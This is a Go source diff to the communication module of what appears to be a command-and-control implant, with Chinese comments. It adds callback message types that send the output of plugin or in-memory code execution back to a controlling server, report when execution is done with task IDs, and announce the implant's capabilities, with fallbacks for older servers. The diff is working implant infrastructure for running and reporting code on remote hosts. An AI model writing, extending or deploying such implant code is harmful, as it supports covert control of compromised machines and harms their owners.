@@ -3,10 +3,64 @@ package communication
 import (
 	"bytes"
 	"encoding/binary"
-	"implant/core/encrypt"
 	"implant/core/debuglog"
+	"implant/core/encrypt"
 	"implant/core/utils"
+	"sync"
+	"sync/atomic"
 )
+
+// execCapabilityOnce 保证能力上报每进程只发一次（服务端重启后靠 EXEC_DONE 自愈）。
+var execCapabilityOnce sync.Once
+
+// execOutputEnabled 服务端确认支持 EXEC_OUTPUT 后置位；未确认时执行输出仍走
+// type=0（旧服务端兼容，避免输出丢失）。
+var execOutputEnabled atomic.Bool
+
+// EnableExecOutput 由 EXEC_OUTPUT_ENABLE(99) 命令调用。
+func EnableExecOutput() { execOutputEnabled.Store(true) }
+
+// ExecOutput 回送插件/内存执行过程输出：
+//   - 服务端确认支持时用 type=98：写 shell 历史但不触发任务完成；
+//   - 否则退回 type=0，保持旧服务端可见性（代价是旧服务端仍按输出近似完成任务）。
+func ExecOutput(b []byte) {
+	if !execOutputEnabled.Load() {
+		DataProcess(0, b)
+		return
+	}
+	result, err := utils.CodepageToUTF8(b)
+	if err != nil {
+		result = b
+	}
+	criticalSection(98, result)
+}
+
+// ExecDone 回送插件/内存执行结束回执（type=96）：[4B taskID][1B ok][utf8 error]。
+//
+// 不走 DataProcess：type=0 会做码页→UTF-8 转换，错误文本不需要也不应被转换。
+func ExecDone(taskID uint32, ok bool, errMsg string) {
+	payload := make([]byte, 5, 5+len(errMsg))
+	binary.BigEndian.PutUint32(payload[:4], taskID)
+	if ok {
+		payload[4] = 1
+	}
+	payload = append(payload, []byte(errMsg)...)
+	criticalSection(96, payload)
+}
+
+// ReportExecCapabilityOnce 在客户端首次成功收到服务端数据后上报能力（一次）。
+func ReportExecCapabilityOnce() {
+	execCapabilityOnce.Do(func() {
+		ReportExecCapability()
+	})
+}
+
+// ReportExecCapability 立即上报执行完成能力（type=97）。
+// 除首次上报外，收到不带 EXD1 头的执行命令时也会补发一次（服务端重启后
+// 能力表会丢失，轮询客户端不会重连，只能靠这里自愈）。
+func ReportExecCapability() {
+	criticalSection(97, []byte{1})
+}
 
 // ErrorProcess 将错误信息作为结果回送（callbackType=31）。
 func ErrorProcess(err error) {
